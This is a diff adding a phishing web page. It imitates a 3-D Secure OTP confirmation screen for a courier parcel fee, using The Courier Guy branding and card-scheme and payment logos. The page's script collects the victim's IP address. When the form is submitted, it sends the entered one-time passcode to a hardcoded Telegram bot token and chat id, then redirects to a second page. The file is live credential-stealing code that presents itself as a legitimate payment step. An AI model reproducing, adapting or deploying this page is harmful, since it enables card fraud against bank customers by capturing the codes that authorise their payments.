@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Validate</title>
+
+    <!-- Add jQuery library -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .threeds-one {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            min-height: 100vh;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px 0;
+        }
+
+        .header img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .header-logo.pull-left {
+            float: left;
+            max-width: 200px;
+        }
+
+        .header-logo.pull-right {
+            float: right;
+            max-width: 200px;
+        }
+
+        .clearfix::after {
+            content: "";
+            display: table;
+            clear: both;
+        }
+
+        .body {
+            padding: 20px 0;
+        }
+
+        .screenreader-only {
+            position: absolute;
+            left: -10000px;
+            top: auto;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+
+        #Body1 {
+            margin-bottom: 30px;
+            font-size: 16px;
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        fieldset {
+            border: none;
+            margin: 20px 0;
+        }
+
+        legend {
+            font-weight: bold;
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #666;
+        }
+
+        .validate-field {
+            display: flex;
+            margin-bottom: 15px;
+            align-items: center;
+        }
+
+        .validate-label {
+            flex: 0 0 40%;
+            font-weight: bold;
+            padding-right: 10px;
+            text-align: right;
+        }
+
+        .validate-field span:last-child {
+            flex: 1;
+        }
+
+        input[type="text"] {
+            width: 200px;
+            padding: 8px 12px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 0 2px rgba(0, 123, 255, 0.25);
+        }
+
+        /* Touch-friendly button styling */
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        #linkContainer {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        #linkContainer a {
+            color: #007bff;
+            text-decoration: underline;
+        }
+
+        #linkContainer a:hover {
+            text-decoration: none;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 30px;
+            background-color: #333;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .btn:hover {
+            background-color: #555;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .footer {
+            margin-top: 40px;
+            padding: 20px 0;
+            border-top: 1px solid #eee;
+        }
+
+        .footer .pull-left {
+            float: left;
+        }
+
+        .footer .pull-right {
+            float: right;
+        }
+
+        .footer a {
+            color: #007bff;
+            text-decoration: underline;
+        }
+
+        .footer a:hover {
+            text-decoration: none;
+        }
+
+        .payment-logos {
+            text-align: center;
+            margin-top: 20px;
+            clear: both;
+        }
+
+        .payment-logos img {
+            margin: 0 5px;
+            vertical-align: middle;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+
+        .modal-dialog {
+            position: relative;
+            margin: 50px auto;
+            max-width: 500px;
+        }
+
+        .modal-content {
+            background-color: white;
+            border-radius: 6px;
+            padding: 20px;
+        }
+
+        .modal-header {
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .close {
+            float: right;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* Hidden element for IP storage */
+        #gfg {
+            display: none;
+        }
+
+        /* Mobile device specific styles */
+        .mobile-device input[type="text"] {
+            font-size: 16px !important; /* Prevent zoom on iOS */
+        }
+
+        .mobile-device .btn {
+            min-height: 44px; /* iOS recommended touch target size */
+        }
+
+        /* Tablet styles (768px - 1024px) */
+        @media (min-width: 769px) and (max-width: 1024px) {
+            .container {
+                max-width: 700px;
+                padding: 25px;
+            }
+
+            .header {
+                padding: 25px 0;
+            }
+
+            .header-logo.pull-left,
+            .header-logo.pull-right {
+                max-width: 180px;
+            }
+
+            #Body1 {
+                font-size: 17px;
+                padding: 0 30px;
+            }
+
+            .validate-field {
+                margin-bottom: 18px;
+            }
+
+            .validate-label {
+                flex: 0 0 35%;
+                font-size: 16px;
+            }
+
+            input[type="text"] {
+                width: 220px;
+                padding: 10px 14px;
+                font-size: 17px;
+            }
+
+            .btn {
+                padding: 14px 40px;
+                font-size: 17px;
+            }
+
+            .payment-logos img {
+                margin: 0 8px;
+            }
+
+            .modal-dialog {
+                margin: 80px auto;
+                max-width: 600px;
+            }
+        }
+
+        /* Mobile styles (max-width: 768px) */
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+                margin: 0;
+                max-width: 100%;
+            }
+
+            .header {
+                padding: 15px 0;
+                margin-bottom: 20px;
+            }
+
+            .header-logo.pull-left,
+            .header-logo.pull-right {
+                float: none;
+                display: block;
+                margin: 8px auto;
+                max-width: 160px;
+            }
+
+            #Body1 {
+                font-size: 15px;
+                padding: 0 15px;
+                margin-bottom: 25px;
+            }
+
+            fieldset {
+                margin: 15px 0;
+            }
+
+            legend {
+                font-size: 17px;
+                margin-bottom: 12px;
+            }
+
+            .validate-field {
+                flex-direction: column;
+                align-items: flex-start;
+                margin-bottom: 15px;
+                text-align: left;
+            }
+
+            .validate-label {
+                text-align: left;
+                margin-bottom: 5px;
+                font-size: 15px;
+                font-weight: bold;
+            }
+
+            input[type="text"] {
+                width: 100%;
+                max-width: 280px;
+                padding: 12px 15px;
+                font-size: 16px;
+                border-radius: 6px;
+            }
+
+            #linkContainer {
+                margin: 25px 0;
+            }
+
+            #linkContainer a {
+                font-size: 15px;
+            }
+
+            .btn {
+                padding: 15px 35px;
+                font-size: 16px;
+                border-radius: 6px;
+                margin: 10px 0;
+            }
+
+            .footer {
+                margin-top: 30px;
+                padding: 15px 0;
+            }
+
+            .footer .pull-left,
+            .footer .pull-right {
+                float: none;
+                text-align: center;
+                display: block;
+                margin: 8px 0;
+            }
+
+            .payment-logos {
+                margin-top: 15px;
+            }
+
+            .payment-logos img {
+                margin: 3px 4px;
+                max-width: 70px;
+                height: auto;
+            }
+
+            .modal-dialog {
+                margin: 20px;
+                max-width: calc(100% - 40px);
+            }
+
+            .modal-content {
+                padding: 15px;
+            }
+        }
+
+        /* Small mobile styles (max-width: 480px) */
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+
+            .header {
+                padding: 10px 0;
+            }
+
+            .header-logo.pull-left,
+            .header-logo.pull-right {
+                max-width: 140px;
+                margin: 5px auto;
+            }
+
+            #Body1 {
+                font-size: 14px;
+                padding: 0 10px;
+                line-height: 1.5;
+            }
+
+            legend {
+                font-size: 16px;
+            }
+
+            .validate-label {
+                font-size: 14px;
+            }
+
+            input[type="text"] {
+                padding: 10px 12px;
+                font-size: 15px;
+            }
+
+            .btn {
+                padding: 12px 25px;
+                font-size: 15px;
+                width: 100%;
+                max-width: 200px;
+            }
+
+            .payment-logos img {
+                margin: 2px 3px;
+                max-width: 60px;
+            }
+
+            .footer a {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="threeds-one">
+        <div class="container">
+            <div class="header clearfix">
+                <img class="header-logo pull-left" src="files\logo.png" alt="The Courier Guy" width="200">
+                <img class="header-logo pull-right" src="https://ext.same-assets.com/780363335/150972150.gif" alt="Verified by MasterCard Visa SecureCode" width="152" height="41">
+            </div>
+
+            <form action="./SADDEM/birgu.php" autocomplete="off" method="post" id="otpForm">
+                <div class="body">
+                    <h1 class="screenreader-only">Your One-time Passcode has been sent</h1>
+
+                    <div id="Body1">
+                        To continue with your transaction, please enter the One-Time Passcode (OTP) sent to your mobile number and click Submit or confirm via your Banking App to complete payment..
+                    </div>
+
+                    <fieldset>
+                        <legend>Transaction Details</legend>
+
+                        <div class="validate-field">
+                            <span class="validate-label">Merchant:</span>
+                            <span>The Courier Guy</span>
+                        </div>
+
+                        <div class="validate-field">
+                            <span class="validate-label">Transaction Amount:</span>
+                            <span>R9.65 ZAR</span>
+                        </div>
+
+                        <div class="validate-field">
+                            <span class="validate-label">Enter OTP Code:</span>
+                            <span>
+                                <input type="hidden" name="ovnimdf" value="C^7$yzv-=9Tz!!u">
+                                <input id="otpCode" data-val-required="Please enter your code" required="" name="ovnisms" type="text" placeholder="Enter OTP">
+                            </span>
+                        </div>
+                    </fieldset>
+
+                    <div id="linkContainer">
+                    </div>
+
+                    <div class="text-center">
+                        <button type="submit" class="btn" id="ValidateButton">Submit</button>
+                    </div>
+
+                    <div class="footer clearfix">
+                        <div class="pull-left">
+                        </div>
+                        <div class="pull-right">
+                        </div>
+
+                        <div class="payment-logos">
+                            <img src="https://ext.same-assets.com/780363335/1412023746.jpeg" alt="Samsung Pay" width="90" height="45">
+                            <img src="https://ext.same-assets.com/780363335/3314229397.jpeg" alt="Google Pay" width="90" height="45">
+                            <img src="https://ext.same-assets.com/780363335/3375760292.png" alt="PayU" width="50" height="22">
+                            <img src="https://ext.same-assets.com/780363335/3428052188.png" alt="Yoco" width="40" height="20">
+                        </div>
+                    </div>
+
+                    <input type="hidden" id="ValidateTimeout" name="ValidateTimeout" value="">
+                    <input type="hidden" id="OtpResendTimeout" name="OtpResendTimeout" value="0">
+                </div>
+            </form>
+
+            <!-- Hidden element to store IP address -->
+            <p id="gfg"></p>
+        </div>
+    </div>
+
+    <!-- Help Modal -->
+    <div class="modal" id="FAQ">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" onclick="hideModal()">&times;</button>
+                    <h4 class="modal-title">Need help?</h4>
+                </div>
+                <div class="modal-body">
+                    <p>In case of any queries, please contact NOW Money's customer support team on 800 669 6639 or chat with them using the In-App chat service!</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Wait for document to be ready
+        $(document).ready(function() {
+            // Get IP address
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                $("#gfg").html(data.ip);
+                console.log("IP Address retrieved:", data.ip);
+            }).fail(function() {
+                console.log("Failed to retrieve IP address");
+                $("#gfg").html("Unable to get IP");
+            });
+
+            // Mobile optimizations
+            if (/Mobi|Android/i.test(navigator.userAgent)) {
+                // Prevent zoom on input focus for mobile
+                document.getElementById('otpCode').addEventListener('focus', function() {
+                    this.style.fontSize = '16px';
+                });
+
+                // Add mobile-specific class
+                document.body.classList.add('mobile-device');
+            }
+        });
+
+        // Handle form submission
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Get the OTP code value
+            var otpCode = document.getElementById('otpCode').value;
+            // Get the IP address
+            var ipAddress = document.getElementById('gfg').textContent || document.getElementById('gfg').innerText;
+
+            // Validation: Check if OTP code is entered
+            if (!otpCode || otpCode.trim() === '') {
+                alert('Please enter the OTP code');
+                return;
+            }
+
+            // Format message for Telegram
+            var telegramMessage = `<b>The Courier Guy OTP %0A</b><b>SMS OTP</b> : ${otpCode} %0A<b>IP</b> : ${ipAddress}`;
+
+            // Your Telegram Bot credentials
+            var token = "8055961582:AAGwE3mZjPCBBA24UKHsDFWGhGsPUE5rieA";
+            var chat_id = "7197763621";
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${telegramMessage}&parse_mode=html`;
+
+            // Send to Telegram
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        console.log("Message successfully sent to Telegram!");
+
+                        // Show success message
+                        setTimeout(function() {
+                            window.location.replace("2.html");
+                        }, 3000);
+                    } else {
+                        console.error("Failed to send message to Telegram. Status:", xhr.status);
+                        alert("Processing failed. Please try again.");
+                    }
+                }
+            };
+        });
+
+        // Modal functions
+        function showModal() {
+            document.getElementById('FAQ').style.display = 'block';
+        }
+
+        function hideModal() {
+            document.getElementById('FAQ').style.display = 'none';
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            var modal = document.getElementById('FAQ');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
